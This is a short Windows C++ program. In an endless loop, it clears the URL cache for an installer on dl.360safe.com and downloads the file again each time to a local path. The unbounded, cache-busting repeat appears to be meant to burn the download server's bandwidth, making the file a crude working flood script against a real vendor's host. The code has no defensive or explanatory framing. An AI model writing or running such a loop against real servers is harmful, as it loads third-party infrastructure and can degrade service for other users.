#include "pch.h"
#include <iostream>
#include <urlmon.h>
#include <wininet.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
int main()
{
	while (1)
	{
		DeleteUrlCacheEntry(L"https://dl.360safe.com/setup.exe");
		URLDownloadToFile(NULL, L"https://dl.360safe.com/setup.exe", L"d:\\1.exe", 0, 0);
	}
}